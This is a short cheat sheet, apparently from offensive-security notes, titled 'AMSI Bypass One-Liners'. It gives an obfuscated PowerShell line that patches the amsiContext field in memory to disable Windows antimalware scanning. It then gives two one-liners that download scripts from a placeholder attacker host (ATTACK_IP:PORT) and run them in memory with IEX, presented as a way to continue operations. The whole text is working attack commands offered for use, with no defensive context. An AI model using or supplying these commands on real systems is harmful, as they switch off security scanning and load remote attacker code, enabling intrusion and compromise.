# AMSI Bypass One-Liners

    $x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)

### Then

    (new-object system.net.webclient).downloadstring('http://ATTACK_IP:PORT/amsi_rmouse.txt')|IEX

### Then, download any powershell script you want to continue operations

    iex(new-object net.webclient).downloadstring('http://ATTACK_IP:PORT/PowerSharpPack.ps1')
